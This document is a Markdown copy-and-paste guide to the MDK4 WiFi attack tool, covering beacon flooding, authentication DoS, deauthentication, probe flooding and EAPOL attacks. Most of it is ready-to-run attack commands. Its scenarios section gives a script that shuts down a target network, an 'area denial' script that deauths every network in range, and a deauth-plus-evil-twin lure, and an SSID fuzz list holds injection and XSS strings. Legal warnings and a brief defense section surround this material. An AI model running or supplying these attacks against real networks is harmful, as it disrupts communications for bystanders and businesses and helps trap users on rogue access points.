# 💥 MDK4 - Complete Copy & Paste Guide

> **⚠️ LEGAL WARNING**: Only use these tools on networks you own or have explicit written permission to test. Jamming wireless networks is illegal in most countries. Unauthorized use can result in criminal prosecution.

## 📋 Table of Contents
1. [What is MDK4?](#what-is-mdk4)
2. [Installation](#installation)
3. [Monitor Mode Setup](#monitor-mode-setup)
4. [Attack Modes Overview](#attack-modes-overview)
5. [Beacon Flooding](#beacon-flooding)
6. [Authentication DoS](#authentication-dos)
7. [Deauthentication Attacks](#deauthentication-attacks)
8. [Probe Request Flooding](#probe-request-flooding)
9. [EAPOL Attacks](#eapol-attacks)
10. [Complete Attack Scenarios](#complete-attack-scenarios)
11. [Defense Strategies](#defense-strategies)

---

## 🔍 What is MDK4?

MDK4 (Murder Death Kill 4) is a WiFi testing tool for IEEE 802.11 networks. It can perform various attacks:
- **Beacon Flooding** - Create thousands of fake access points
- **Authentication DoS** - Flood APs with auth requests
- **Deauthentication** - Disconnect clients from networks
- **Probe Request Flooding** - Spam probe requests
- **EAPOL/TKIP attacks** - Exploit WPA/WPA2 weaknesses

---

## 🔌 Installation

### Kali Linux (Pre-installed)
```bash
# Check if installed
mdk4 --help

# If not installed
sudo apt update
sudo apt install mdk4
```

### Debian/Ubuntu
```bash
sudo apt update
sudo apt install -y mdk4
```

### Arch Linux
```bash
sudo pacman -S mdk4
```

### From Source
```bash
# Install dependencies
sudo apt install -y build-essential libpcap-dev

# Clone repository
git clone https://github.com/aircrack-ng/mdk4.git
cd mdk4

# Compile
make

# Install
sudo make install

# Verify
mdk4 --help
```

---

## 📡 Monitor Mode Setup

**MDK4 REQUIRES monitor mode to work!**

### Method 1: Using airmon-ng (Recommended)

```bash
# Step 1: Check wireless interface
iwconfig

# Step 2: Kill interfering processes
sudo airmon-ng check kill

# Step 3: Enable monitor mode
sudo airmon-ng start wlan0

# Your interface is now: wlan0mon

# Step 4: Verify
iwconfig
```

### Method 2: Manual Setup

```bash
# Step 1: Bring interface down
sudo ip link set wlan0 down

# Step 2: Set monitor mode
sudo iw dev wlan0 set type monitor

# Step 3: Bring interface up
sudo ip link set wlan0 up

# Step 4: Verify
iwconfig wlan0
```

### Stop Monitor Mode

```bash
# Using airmon-ng
sudo airmon-ng stop wlan0mon

# Restart network manager
sudo systemctl restart NetworkManager
```

---

## 🎯 Attack Modes Overview

MDK4 has different attack modes (letters):

| Mode | Attack Type | Purpose |
|------|-------------|---------|
| **b** | Beacon Flooding | Create fake APs |
| **a** | Authentication DoS | Flood authentication requests |
| **p** | Probe Request | Spam probe requests |
| **d** | Deauthentication | Disconnect clients |
| **m** | Michael Shutdown | TKIP exploit |
| **e** | EAPOL Start | WPA handshake DoS |
| **s** | EAPOL Logoff | Force logoff |
| **w** | WIDS Confusion | Confuse intrusion detection |
| **f** | Packet Fuzzer | Send malformed packets |

---

## 📻 Beacon Flooding (Mode b)

### Flow 1: Basic Beacon Flood

**Creates fake access points to flood the area**

```bash
# Simple beacon flood with random SSIDs
sudo mdk4 wlan0mon b

# You'll see:
# Generating ESSID from wordlist...
# Sending beacon frames...
```

**What this does:**
- Creates hundreds of fake WiFi networks
- Uses random SSIDs and MAC addresses
- Clutters WiFi scanners
- Can hide real networks

### Flow 2: Custom SSID Beacon Flood

**Step 1: Create SSID Wordlist**
```bash
cat > ssids.txt << 'EOF'
FREE_WIFI
Starbucks_Guest
FBI_Surveillance_Van
Airport_Free_WiFi
Definitely_Not_A_Trap
DROP TABLE networks;--
¯\_(ツ)_/¯
🔥 HOT WIFI 🔥
☠️ DANGER ☠️
EOF
```

**Step 2: Run Beacon Flood with Custom SSIDs**
```bash
sudo mdk4 wlan0mon b -f ssids.txt

# Options explained:
# b = beacon flood mode
# -f ssids.txt = use this SSID list
```

### Flow 3: Advanced Beacon Flood

```bash
# Beacon flood with WPA2 encryption advertised
sudo mdk4 wlan0mon b -f ssids.txt -w

# With specific channel
sudo mdk4 wlan0mon b -f ssids.txt -c 6

# Speed control (packets per second)
sudo mdk4 wlan0mon b -f ssids.txt -s 1000

# Full control
sudo mdk4 wlan0mon b -f ssids.txt -w -c 6 -s 500
```

**Parameters:**
- `-f FILE` - Use SSID wordlist
- `-w` - Use WPA/WPA2 encryption
- `-c CHANNEL` - Target specific channel (1-14)
- `-s SPEED` - Packets per second
- `-h` - Use random channels (hop)

---

## 🔐 Authentication DoS (Mode a)

### Flow 4: Authentication Flood Attack

**Floods an AP with authentication requests, overwhelming it**

**Step 1: Find Target AP**
```bash
# Scan for networks first
sudo airodump-ng wlan0mon

# Note the BSSID (MAC) of target AP
# Example: AA:BB:CC:DD:EE:FF
```

**Step 2: Launch Auth Flood**
```bash
# Basic auth flood
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF

# With speed control
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -s 1024
```

**Parameters:**
- `-a MAC` - Target AP BSSID
- `-s SPEED` - Packets per second (default: 250)
- `-i MAC` - Use specific source MAC

### Flow 5: Intelligent Auth Attack

```bash
# Attack with valid client MAC spoofing
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -i 11:22:33:44:55:66

# This makes the attack look like it's from a real client
```

---

## ⚡ Deauthentication Attacks (Mode d)

### Flow 6: Basic Deauth Attack

**Disconnects clients from a WiFi network**

**Step 1: Identify Target**
```bash
# Scan networks
sudo airodump-ng wlan0mon

# Note:
# - BSSID (AP MAC): AA:BB:CC:DD:EE:FF
# - Channel: 6
```

**Step 2: Simple Deauth (Broadcast)**
```bash
# Deauth all clients on all networks on channel 6
sudo mdk4 wlan0mon d -c 6

# This sends deauth to everyone in range
```

### Flow 7: Targeted Deauth Attack

**Step 1: Find Specific Client**
```bash
# Focus on specific channel
sudo airodump-ng -c 6 wlan0mon

# Note client MAC (STATION): 11:22:33:44:55:66
```

**Step 2: Create Blacklist (Targets)**
```bash
# Create file with target AP BSSID
echo "AA:BB:CC:DD:EE:FF" > targets.txt
```

**Step 3: Launch Targeted Deauth**
```bash
# Deauth only clients connected to specific AP
sudo mdk4 wlan0mon d -b targets.txt -c 6

# -b = blacklist (target these APs)
# -c 6 = operate on channel 6
```

### Flow 8: Continuous Deauth Attack

**Keep clients disconnected permanently**

```bash
# Continuous deauth with aggressive timing
sudo mdk4 wlan0mon d -b targets.txt -c 6 -s 1000

# -s 1000 = send 1000 deauth packets per second
```

### Flow 9: Whitelist Protection

**Deauth everyone EXCEPT specific clients**

**Step 1: Create Whitelist**
```bash
# Clients to protect (your devices)
cat > whitelist.txt << 'EOF'
11:22:33:44:55:66
AA:BB:CC:DD:EE:FF
EOF
```

**Step 2: Run Protected Deauth**
```bash
# Deauth everyone except whitelisted MACs
sudo mdk4 wlan0mon d -w whitelist.txt -c 6

# -w = whitelist (protect these MACs)
```

---

## 🔍 Probe Request Flooding (Mode p)

### Flow 10: Probe Request Spam

**Floods area with probe requests for networks**

**Step 1: Create SSID List**
```bash
cat > probe_ssids.txt << 'EOF'
linksys
netgear
dlink
HOME-WIFI
Office_Network
EOF
```

**Step 2: Launch Probe Flood**
```bash
# Basic probe flood
sudo mdk4 wlan0mon p -f probe_ssids.txt

# With speed control
sudo mdk4 wlan0mon p -f probe_ssids.txt -s 500
```

**What this does:**
- Makes it look like devices are searching for these networks
- Can trigger APs to respond
- Creates noise in WIDS/WIPS systems

---

## 🔒 EAPOL Attacks (Modes e/s)

### Flow 11: EAPOL Start Flood

**Causes WPA handshake DoS**

```bash
# Find target AP
sudo airodump-ng wlan0mon
# Note BSSID: AA:BB:CC:DD:EE:FF

# Launch EAPOL start flood
sudo mdk4 wlan0mon e -t AA:BB:CC:DD:EE:FF

# -t = target AP BSSID
```

**Effect:** Forces AP to process thousands of handshake requests

### Flow 12: EAPOL Logoff Attack

**Forces clients to disconnect from WPA networks**

```bash
# Create target list
echo "AA:BB:CC:DD:EE:FF" > ap_targets.txt

# Launch logoff attack
sudo mdk4 wlan0mon s -b ap_targets.txt

# -b = target these APs
```

---

## 🎬 Complete Attack Scenarios

### Scenario 1: Complete Network Shutdown

**Goal:** Make a WiFi network completely unusable

**Step 1: Setup Monitor Mode**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

**Step 2: Identify Target**
```bash
# Scan for 30 seconds
timeout 30 sudo airodump-ng wlan0mon

# Note target:
# BSSID: AA:BB:CC:DD:EE:FF
# Channel: 6
# ESSID: TargetNetwork
```

**Step 3: Create Attack Script**
```bash
cat > shutdown_wifi.sh << 'EOF'
#!/bin/bash

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL="6"
INTERFACE="wlan0mon"

echo "[*] Starting WiFi shutdown attack..."
echo "[*] Target: $TARGET_BSSID"
echo "[*] Channel: $CHANNEL"

# Create target file
echo $TARGET_BSSID > /tmp/target.txt

# Launch multiple attacks in background
echo "[*] Launching deauth attack..."
sudo mdk4 $INTERFACE d -b /tmp/target.txt -c $CHANNEL &

sleep 2

echo "[*] Launching auth flood..."
sudo mdk4 $INTERFACE a -a $TARGET_BSSID -s 1024 &

sleep 2

echo "[*] Launching EAPOL attack..."
sudo mdk4 $INTERFACE e -t $TARGET_BSSID &

echo "[+] All attacks launched!"
echo "[!] Press Ctrl+C to stop"

wait
EOF

chmod +x shutdown_wifi.sh
```

**Step 4: Execute**
```bash
./shutdown_wifi.sh
```

**Step 5: Stop**
```bash
# Press Ctrl+C, then kill all mdk4 processes
sudo killall mdk4
```

### Scenario 2: Area Denial (All Networks)

**Make all WiFi in an area unusable**

```bash
#!/bin/bash
# WARNING: This is extremely disruptive

INTERFACE="wlan0mon"

echo "[!] Starting area-wide WiFi disruption"
echo "[!] This will affect ALL networks in range"

# Deauth on all common channels simultaneously
for channel in 1 6 11; do
    echo "[*] Attacking channel $channel..."
    sudo mdk4 $INTERFACE d -c $channel &
    sleep 1
done

echo "[+] Multi-channel deauth active"
wait
```

### Scenario 3: WiFi Honeypot + Deauth

**Force users to connect to your fake AP**

**Step 1: Create Fake AP List**
```bash
cat > fake_aps.txt << 'EOF'
FREE_PUBLIC_WIFI
Starbucks_Guest
Airport_WiFi
Hotel_Guest_Network
EOF
```

**Step 2: Terminal 1 - Beacon Flood**
```bash
# Create attractive fake networks
sudo mdk4 wlan0mon b -f fake_aps.txt -w -c 6
```

**Step 3: Terminal 2 - Deauth Real Networks**
```bash
# Disconnect users from real networks
sudo mdk4 wlan0mon d -c 6
```

**Step 4: Terminal 3 - Setup Evil Twin**
```bash
# Use hostapd to create actual fake AP
# (Not MDK4, but completes the attack)
sudo hostapd /etc/hostapd/hostapd.conf
```

### Scenario 4: Stress Test Your Own Network

**Legal use: Testing your own network's resilience**

```bash
#!/bin/bash
# Test your network's resistance to attacks

YOUR_BSSID="AA:BB:CC:DD:EE:FF"
YOUR_CHANNEL="6"

echo "[*] Testing network resilience..."
echo "[*] Target: $YOUR_BSSID (YOUR network)"
echo "[*] Duration: 60 seconds"

# Mild deauth test
timeout 60 sudo mdk4 wlan0mon d -b <(echo $YOUR_BSSID) -c $YOUR_CHANNEL -s 50

echo "[+] Test complete"
echo "[*] Check if clients reconnected"
echo "[*] Review AP logs for detection"
```

---

## 🛡️ Defense Strategies

### How to Detect MDK4 Attacks

1. **Monitor for Deauth Frames**
```bash
# Use airodump-ng to see deauth packets
sudo airodump-ng -c 6 wlan0mon

# Look for rapid deauth packets in bottom section
```

2. **Use WIDS/WIPS Systems**
- Kismet
- Snort with WiFi rules
- Commercial solutions (Cisco, Aruba)

3. **Check AP Logs**
```bash
# Most enterprise APs log unusual activity
# Look for:
# - High authentication failures
# - Repeated deauth frames
# - Unknown MAC addresses
```

### Protection Measures

1. **802.11w (PMF - Protected Management Frames)**
```bash
# Enable on your router if available
# WPA3 includes this by default
# WPA2 can use it optionally
```

2. **MAC Filtering** (Limited effectiveness)
```bash
# Whitelist known devices
# But MAC addresses can be spoofed
```

3. **Wireless Intrusion Prevention System (WIPS)**
- Automatically detects and blocks attacks
- Can deauth attacking devices
- Enterprise solution

4. **Use 5GHz Networks**
```bash
# Less crowded
# Shorter range (harder for attacker)
# Same vulnerabilities but requires closer proximity
```

5. **Network Segmentation**
```bash
# Separate critical systems from WiFi
# Use VLANs
# Implement strong firewall rules
```

---

## 🔧 Advanced Usage

### Channel Hopping

```bash
# Attack all channels by hopping
sudo mdk4 wlan0mon d -h

# Custom hop interval (in ms)
sudo mdk4 wlan0mon d -h -t 250
```

### Using Multiple Interfaces

```bash
# If you have multiple WiFi cards
# Terminal 1
sudo mdk4 wlan0mon b -f ssids.txt

# Terminal 2 (different card)
sudo mdk4 wlan1mon d -c 6
```

### Combining with Other Tools

```bash
# Use with airodump-ng for monitoring
# Terminal 1: Monitor
sudo airodump-ng -c 6 wlan0mon

# Terminal 2: Attack
sudo mdk4 wlan1mon d -c 6
```

### SSID Fuzzing

```bash
# Create SSIDs with special characters
cat > fuzz_ssids.txt << 'EOF'
' OR '1'='1
<script>alert('XSS')</script>
../../../etc/passwd
%00NULL%00
\x00\x00\x00\x00
../../../../boot.ini
DROP TABLE networks;
EOF

sudo mdk4 wlan0mon b -f fuzz_ssids.txt
```

---

## 📊 Attack Effectiveness

### Beacon Flood
- **Effectiveness:** High for confusion, low for actual damage
- **Detection:** Easy (unusual number of SSIDs)
- **Defense:** Filtering, WIDS

### Authentication DoS
- **Effectiveness:** Medium (can slow down AP)
- **Detection:** Medium (shows in AP logs)
- **Defense:** Rate limiting, WIPS

### Deauthentication
- **Effectiveness:** Very High (disconnects clients)
- **Detection:** Easy with proper monitoring
- **Defense:** 802.11w (PMF), WIPS

### Probe Flooding
- **Effectiveness:** Low for damage, high for noise
- **Detection:** Medium
- **Defense:** Probe rate limiting

---

## 🆘 Quick Reference Card

```bash
# MONITOR MODE
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# BEACON FLOOD
sudo mdk4 wlan0mon b -f ssids.txt -w -c 6

# AUTH DOS
sudo mdk4 wlan0mon a -a <BSSID> -s 1024

# DEAUTH (all)
sudo mdk4 wlan0mon d -c 6

# DEAUTH (targeted)
sudo mdk4 wlan0mon d -b targets.txt -c 6

# PROBE FLOOD
sudo mdk4 wlan0mon p -f ssids.txt

# EAPOL START
sudo mdk4 wlan0mon e -t <BSSID>

# STOP ATTACKS
sudo killall mdk4

# STOP MONITOR MODE
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 🎓 Common Parameters

| Flag | Meaning | Example |
|------|---------|---------|
| `-c` | Channel | `-c 6` |
| `-b` | Blacklist file | `-b targets.txt` |
| `-w` | Whitelist file | `-w safe.txt` |
| `-f` | SSID file | `-f ssids.txt` |
| `-s` | Speed (pps) | `-s 1000` |
| `-a` | Target AP MAC | `-a AA:BB:CC:DD:EE:FF` |
| `-t` | Target | `-t <BSSID>` |
| `-h` | Channel hop | `-h` |
| `-i` | Source MAC | `-i 11:22:33:44:55:66` |

---

## ⚠️ Legal Disclaimer

### YOU CAN GO TO JAIL FOR MISUSING THIS TOOL

**MDK4 is illegal to use without authorization because:**

1. **FCC Violations** (USA)
   - Jamming wireless signals is a federal crime
   - Fines up to $112,500 per violation
   - Possible imprisonment

2. **Computer Fraud and Abuse Act** (USA)
   - Unauthorized access to computer systems
   - Up to 10 years imprisonment

3. **Communications Act**
   - Interfering with communications is illegal
   - Severe penalties

4. **International Laws**
   - Most countries have similar laws
   - UK: Computer Misuse Act
   - EU: Various cybercrime directives

### Legal Use Cases ONLY:

✅ Your own network
✅ Authorized penetration testing with written contract
✅ Security research in isolated lab
✅ Educational purposes in controlled environment
✅ CTF competitions
✅ WiFi equipment you own for testing

### DO NOT USE FOR:

❌ "Testing" public WiFi
❌ "Pranking" neighbors
❌ Disrupting businesses
❌ Any unauthorized network
❌ "Seeing if it works"

**Get written permission or don't use it. Period.**

---

## 📚 Additional Resources

- MDK4 on GitHub: https://github.com/aircrack-ng/mdk4
- Aircrack-ng Suite: https://www.aircrack-ng.org/
- WiFi Security Standards: https://www.wi-fi.org/discover-wi-fi/security
- 802.11w (PMF): https://en.wikipedia.org/wiki/IEEE_802.11w-2009

---

## 🔍 Troubleshooting

### "Monitor mode not enabled"
```bash
# Make sure you started monitor mode
sudo airmon-ng start wlan0
```

### "No such device"
```bash
# Check interface name
iwconfig

# Use correct name (wlan0mon, wlan0, etc.)
```

### "Operation not permitted"
```bash
# Run with sudo
sudo mdk4 wlan0mon b
```

### Attacks not working
```bash
# Check you're on right channel
# Verify target BSSID is correct
# Ensure monitor mode is active
# Try increasing speed (-s flag)
```

### Can't stop monitor mode
```bash
# Kill monitor mode
sudo airmon-ng stop wlan0mon

# Manually reset
sudo ip link set wlan0mon down
sudo iw dev wlan0mon set type managed
sudo ip link set wlan0mon up

# Restart network manager
sudo systemctl restart NetworkManager
```

---

**Stay Legal. Stay Ethical. Happy (Authorized) Hacking! 🔒**
